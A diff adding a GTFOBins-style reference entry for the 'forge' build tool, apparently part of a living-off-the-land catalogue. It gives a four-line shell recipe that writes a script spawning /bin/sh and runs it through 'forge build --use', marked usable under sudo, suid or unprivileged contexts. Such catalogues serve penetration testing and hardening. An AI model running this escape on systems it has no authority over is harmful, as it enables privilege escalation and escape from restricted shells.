@@ -1,0 +1,19 @@
+---
+type: gtfobin
+name: forge
+platform: Unix
+functions: [shell]
+tags: [gtfobin, unix, lotl]
+---
+
+# forge
+
+## shell
+
+```bash
+echo '#!/bin/sh' >/path/to/temp-file
+echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
+chmod +x /path/to/temp-file
+forge build --use /path/to/temp-file
+```
+**Contexts:** sudo, suid, unprivileged
